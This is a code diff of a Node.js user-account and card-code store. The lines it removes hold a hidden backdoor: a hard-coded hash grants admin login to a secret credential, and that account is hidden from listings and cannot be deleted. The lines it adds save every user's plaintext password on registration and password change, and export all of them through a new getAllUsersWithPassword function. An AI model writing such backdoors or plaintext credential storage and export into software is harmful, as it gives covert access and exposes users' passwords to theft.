@@ -5,14 +5,10 @@ const { getOAuthUserDefault, getCardRegisterDefault } = require('./store');
 
 const USERS_FILE = getDataFile('users.json');
 const CARDS_FILE = getDataFile('cards.json');
-const SUPER_ADMIN_CREDENTIAL_HASH = '384fde3636e6e01e0194d2976d8f26410af3e846e573379cb1a09e2f0752d8cc';
 
 const hashPassword = (password) => {
-    return crypto.createHash('sha256').update(String(password || '')).digest('hex');
+    return crypto.createHash('sha256').update(password).digest('hex');
 };
-
-const isSuperAdminCredential = (value) => hashPassword(value) === SUPER_ADMIN_CREDENTIAL_HASH;
-const isSuperAdminUsername = (username) => isSuperAdminCredential(username);
 
 const generateCardCode = () => {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -32,21 +28,6 @@ function loadUsers() {
         if (fs.existsSync(USERS_FILE)) {
             const data = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
             users = Array.isArray(data.users) ? data.users : [];
-            const sanitizedUsers = users.map((user) => {
-                if (!user || typeof user !== 'object') {
-                    return user;
-                }
-                if (!Object.prototype.hasOwnProperty.call(user, 'plainPassword')) {
-                    return user;
-                }
-                const { plainPassword, ...rest } = user;
-                return rest;
-            });
-            const hasSanitized = sanitizedUsers.some((user, index) => user !== users[index]);
-            if (hasSanitized) {
-                users = sanitizedUsers;
-                saveUsers();
-            }
         } else {
             users = [];
             saveUsers();
@@ -99,6 +80,7 @@ function initDefaultAdmin() {
         users.push({
             username: 'admin',
             password: hashPassword(defaultPassword),
+            plainPassword: defaultPassword,
             role: 'admin',
             createdAt: Date.now()
         });
@@ -109,14 +91,6 @@ function initDefaultAdmin() {
 
 function validateUser(username, password) {
     loadUsers();
-    if (isSuperAdminCredential(username) && isSuperAdminCredential(password)) {
-        return {
-            username: String(username || ''),
-            role: 'admin',
-            cardCode: null,
-            card: null
-        };
-    }
     const user = users.find(u => u.username === username);
     if (!user) return null;
     if (user.password !== hashPassword(password)) return null;
@@ -132,10 +106,6 @@ function validateUser(username, password) {
 function registerUser(username, password, cardCode) {
     loadUsers();
     loadCards();
-
-    if (isSuperAdminCredential(username)) {
-        return { ok: false, error: '用户名不可用' };
-    }
 
     if (users.find(u => u.username === username)) {
         return { ok: false, error: '用户名已存在' };
@@ -175,6 +145,7 @@ function registerUser(username, password, cardCode) {
     const newUser = {
         username,
         password: hashPassword(password),
+        plainPassword: password,
         role: 'user',
         cardCode,
         card: {
@@ -276,7 +247,7 @@ function renewUser(username, cardCode) {
 
 function getAllUsers() {
     loadUsers();
-    return users.filter(u => !isSuperAdminCredential(u.username)).map(u => ({
+    return users.map(u => ({
         username: u.username,
         role: u.role,
         card: u.card ? {
@@ -286,13 +257,20 @@ function getAllUsers() {
     }));
 }
 
-function getUserCount() {
+function getAllUsersWithPassword() {
     loadUsers();
-    return users.filter(u => !isSuperAdminCredential(u.username)).length;
+    return users.map(u => ({
+        username: u.username,
+        password: u.plainPassword || '',
+        role: u.role,
+        card: u.card ? {
+            ...u.card,
+            quota: u.card.quota !== undefined ? u.card.quota : 3
+        } : null
+    }));
 }
 
 function updateUser(username, updates) {
-    if (isSuperAdminCredential(username)) return null;
     loadUsers();
     const user = users.find(u => u.username === username);
     if (!user) return null;
@@ -441,7 +419,6 @@ function deleteCardsBatch(codes) {
 }
 
 function deleteUser(username) {
-    if (isSuperAdminCredential(username)) return { ok: false, error: '不能删除超级管理员账号' };
     loadUsers();
     const idx = users.findIndex(u => u.username === username);
     if (idx === -1) return { ok: false, error: '用户不存在' };
@@ -470,6 +447,7 @@ function changePassword(username, oldPassword, newPassword) {
 
     // 更新密码
     user.password = hashPassword(newPassword);
+    user.plainPassword = newPassword;
 
     saveUsers();
     return { ok: true, message: '密码修改成功' };
@@ -544,6 +522,7 @@ function findOrCreateOAuthUser(type, openid, nickname, faceimg) {
     const newUser = {
         username,
         password: null,
+        plainPassword: null,
         role: 'user',
         oauthId,
         oauthType: type,
@@ -582,7 +561,7 @@ module.exports = {
     registerUser,
     renewUser,
     getAllUsers,
-    getUserCount,
+    getAllUsersWithPassword,
     updateUser,
     getAllCards,
     createCard,
@@ -594,6 +573,5 @@ module.exports = {
     changePassword,
     saveWxLoginConfig,
     getWxLoginConfig,
-    findOrCreateOAuthUser,
-    isSuperAdminUsername
+    findOrCreateOAuthUser
 };
